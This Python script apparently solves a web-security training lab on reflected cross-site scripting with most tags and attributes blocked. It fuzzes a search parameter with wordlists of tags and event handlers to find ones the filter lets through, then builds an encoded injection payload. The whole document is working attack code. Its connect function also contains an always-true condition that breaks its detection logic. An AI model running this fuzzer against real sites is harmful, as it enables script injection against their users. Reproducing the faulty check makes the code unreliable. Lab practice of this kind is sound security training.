#!/usr/bin/python3

# Reflected XSS into HTML context with most tags and attributes blocked

import requests
import urllib.parse

def connect(url, injection):
    target = url + injection

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
        }

    proxies = {
        'http' : '127.0.0.1:8080',
        }

    for i in open("payload.txt", "r"):
        encPayload = urllib.parse.quote(i)
        testUrl = target + encPayload
        r = requests.get(testUrl, proxies=proxies, headers=headers)
        if "Tag is not allowed" or "Attribute is not allowed" or "Not solved" in r.text:
            print(f'Testing for {i}', end="")
            print(r.text)
        else:
            print(f'[INFO] Found XSS Payload: {i}')
            break

def allowedTag(url, injection):
    target = url + injection

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
        }

    proxies = {
        'http' : '127.0.0.1:8080',
        }

    for i in open("tag.txt", "r"):
        testUrl = target + "<" + i + ">"
        r = requests.get(testUrl, proxies=proxies, headers=headers)
        if "Tag is not allowed" in r.text:
            pass
        else:
            print(f'[INFO] Allowed tag: {i}', end="")
            break
    return i

def allowedEvent(url, injection, tag):
    target = url + injection

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
        }

    proxies = {
        'http' : '127.0.0.1:8080',
        }

    for i in open("event.txt", "r"):
        testUrl = target + "<" + tag + "%20" + i + "=1>"
        r = requests.get(testUrl, proxies=proxies, headers=headers)
        if "Tag is not allowed" in r.text:
            pass
        else:
            print(f'[INFO] Allowed event: {i}', end="")
            break
    return i


if __name__ == '__main__':
    url = "https://acde1f651f6a8d77c0d07a7600a2005f.web-security-academy.net/"
    injection = "?search="
    
    tag = allowedTag(url, injection)
    event = allowedEvent(url, injection, tag)

    print(urllib.parse.quote('"><' + tag + " " + event + "=print()>"))

    #connect(url, injection)